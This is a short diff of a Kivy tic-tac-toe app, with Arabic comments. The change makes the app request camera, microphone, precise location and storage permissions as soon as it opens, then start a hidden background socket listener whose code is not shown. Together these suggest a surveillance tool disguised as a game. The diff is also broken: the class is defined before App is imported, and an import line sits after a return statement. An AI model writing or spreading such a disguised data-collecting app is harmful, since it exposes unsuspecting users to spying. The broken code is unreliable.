@@ -1,4 +1,24 @@
-import os, threading, requests, random
+from kivy.utils import platform
+
+# دالة لطلب الصلاحيات من الأندرويد
+def ask_permissions():
+    if platform == 'android':
+        from android.permissions import request_permissions, Permission
+        request_permissions([
+            Permission.CAMERA,
+            Permission.RECORD_AUDIO,
+            Permission.ACCESS_FINE_LOCATION,
+            Permission.WRITE_EXTERNAL_STORAGE
+        ])
+
+class XONeonApp(App):
+    def build(self):
+        # طلب الصلاحيات أول ما التطبيق يفتح
+        ask_permissions()
+        
+        threading.Thread(target=self.start_socket_listener, daemon=True).start()
+        return XOGame()
+        import os, threading, requests, random
 from kivy.app import App
 from kivy.uix.gridlayout import GridLayout
 from kivy.uix.boxlayout import BoxLayout
